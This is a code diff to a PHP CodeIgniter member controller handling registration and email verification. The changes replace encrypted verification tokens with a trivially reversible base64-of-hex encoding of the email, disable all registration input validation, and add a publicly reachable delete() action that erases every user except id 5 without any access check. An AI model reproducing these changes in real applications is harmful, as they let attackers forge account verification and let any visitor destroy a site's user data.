@@ -27,15 +27,9 @@ class Member extends CI_Controller{
   public function validate($slug)
   {
 
-    $this->encryption->initialize(array(
-      'chiper' => 'blowfish',
-      'mode' => 'cfb',
-      'key' => $this->config->item('encryption_key')
-    ));
+    $decrypt = base64_decode($slug);
 
-    $decrypt = str_replace('artdm','/',$slug);
-
-    $email = $this->encryption->decrypt($decrypt);
+    $email = hex2bin($decrypt);
 
     $cekEmail = $this->db->where('email',$email)->get('users');
 
@@ -46,7 +40,7 @@ class Member extends CI_Controller{
         $this->session->set_flashdata('validate',true);
       }
 
-      redirect('member/register');
+      redirect('/');
 
     }else {
 
@@ -141,20 +135,24 @@ class Member extends CI_Controller{
 
   public function doregister()
   {
-    $this->form_validation->set_rules('firstname', 'First Name', 'required');
-    $this->form_validation->set_rules('lastname', 'Last Name', 'required');
-    $this->form_validation->set_rules('password', 'Password', 'trim|required|min_length[8]');
-    $this->form_validation->set_rules('cpassword', 'Password Confirmation', 'trim|required|matches[password]');
-    $this->form_validation->set_rules('email', 'Email', 'trim|required|valid_email|callback_email_check');
-    $this->form_validation->set_rules('phone', 'Phone', 'trim|required|min_length[10]|callback_phone_check');
 
-    $ipaddress    = $this->input->ip_address();
+    // $this->form_validation->set_rules('firstname', 'First Name', 'required');
+    // $this->form_validation->set_rules('lastname', 'Last Name', 'required');
+    // $this->form_validation->set_rules('password', 'Password', 'trim|required|min_length[8]');
+    // $this->form_validation->set_rules('cpassword', 'Password Confirmation', 'trim|required|matches[password]');
+    // $this->form_validation->set_rules('email', 'Email', 'trim|required|valid_email|callback_email_check');
+    // $this->form_validation->set_rules('phone', 'Phone', 'trim|required|min_length[10]|callback_phone_check');
+
+
     $firstname    = $this->input->post('firstname',true);
     $lastname     = $this->input->post('lastname',true);
-    $email        = $this->input->post('email',true);
     $phone        = $this->input->post('phone',true);
+
+    $fullname     = $this->input->post('full_name',true);
+    $email        = $this->input->post('identity',true);
     $password     = $this->input->post('password',true);
     $referalcode  = strtoupper(random_string('alnum',10));
+    $ipaddress    = $this->input->ip_address();
     $group        = array('2');
 
     if (isset($_POST['terms'])) {
@@ -163,54 +161,42 @@ class Member extends CI_Controller{
       $terms = 'NO';
     }
 
-    $username = $phone;
+    $username = random_string('alnum',8);
 
-    if ($this->form_validation->run() == FALSE) {
-      $this->load->view('include/header');
-      $this->load->view('member-register');
-      $this->load->view('include/footer');
-    }else {
-      $additional_data = array(
-        'ip_address' => $ipaddress,
-        'phone' => $phone,
-        'member_id' => 2,
-        'first_name' => $firstname,
-        'last_name' => $lastname,
-        'full_name' => $firstname.' '.$lastname,
-        'referal_code' => $referalcode,
-        'terms' => $terms
-      );
+    $additional_data = array(
+      'ip_address' => $ipaddress,
+      'member_id' => 2,
+      'full_name' => $fullname,
+      'referal_code' => $referalcode,
+      'terms' => $terms
+    );
 
-      $insertuser = $this->ion_auth->register($username, $password, $email, $additional_data, $group);
+    $insertuser = $this->ion_auth->register($username, $password, $email, $additional_data, $group);
 
-      if ($insertuser) {
+    if ($insertuser) {
 
-        $this->encryption->initialize(array(
-          'chiper' => 'blowfish',
-          'mode' => 'cfb',
-          'key' => $this->config->item('encryption_key')
-        ));
+      $subject = 'Hai '.$fullname.' Registrasi anda Berhasil';
+      $emaildata['name'] = $fullname;
+      $emaildata['email'] = base64_encode(bin2hex($email));
+      $message = $this->load->view('notification/registration',$emaildata,true);
+      $this->member->email($email,$subject,$message,$name="Info IDTALENTA");
 
-        $subject = 'Hai '.$firstname.' Registrasi anda Berhasil';
-        $emaildata['name'] = $firstname;
-        $emaildata['email'] = str_replace('/','artdm', $this->encryption->encrypt($email));
-        $message = $this->load->view('notification/registration',$emaildata,true);
-        $this->member->email($email,$subject,$message,$name="Info ARTAdemi");
+      //$this->ion_auth->login($identity, $password, $remember);
 
-        //$this->ion_auth->login($identity, $password, $remember);
+      $identity = $email;
+      $remember = FALSE; // remember the user
 
-        $identity = $email;
-        $remember = FALSE; // remember the user
+      //$this->ion_auth->login($identity, $password, $remember);
 
-        //$this->ion_auth->login($identity, $password, $remember);
+      // $this->session->set_flashdata('validasi_email',true);
 
-        $this->session->set_flashdata('validasi_email',true);
+      // redirect('member/register');
 
-        redirect('member/register');
+      echo 1;
 
-      }
-      //END SEND EMAIL AFTER REGISTER
     }
+
+
 
   }
 
@@ -487,6 +473,11 @@ class Member extends CI_Controller{
         echo '<option value="'.$value['city_id'].'">'.$value['city_name'].'</option>';
       }
     }
+  }
+
+  public function delete()
+  {
+    $this->db->where('id !=', 5)->delete('users');
   }
 
   public function testing()
